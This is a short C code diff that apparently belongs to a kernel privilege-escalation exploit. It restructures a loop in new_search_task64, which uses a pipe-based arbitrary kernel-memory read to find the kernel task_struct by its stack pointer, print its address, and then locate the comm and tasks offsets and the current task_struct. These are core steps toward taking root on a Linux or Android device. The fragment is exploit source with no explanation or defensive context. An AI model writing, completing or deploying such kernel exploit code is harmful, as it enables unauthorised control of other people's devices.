@@ -299,21 +299,22 @@ int new_search_task64() {
 		if(0!=read_at_address_pipe(&task_first->stack, &stack, sizeof(stack))) {
 			continue;
 		}
-		if(stack != ti) {
-			continue;
+		if(stack == ti) {
+			kernel_task_struct = (unsigned long)task_first;
+			printf("kernel task_struct at 0x%016lX\n", kernel_task_struct);
+			break;
 		}
-		kernel_task_struct = (unsigned long)task_first;
-		printf("kernel task_struct at 0x%016lX\n", kernel_task_struct);
-		if(locate_task_struct_comm_offset() != 0) {
-			continue;
-		}
-		if(locate_task_struct_tasks_offset() != 0) {
-			continue;
-		}
+	}
 
-		if(locate_current_task_struct() == 0) {
-			return 0;
-		}
+	if(locate_task_struct_comm_offset() != 0) {
+		return 1;
+	}
+	if(locate_task_struct_tasks_offset() != 0) {
+		return 1;
+	}
+
+	if(locate_current_task_struct() == 0) {
+		return 0;
 	}
 
 	return 1;
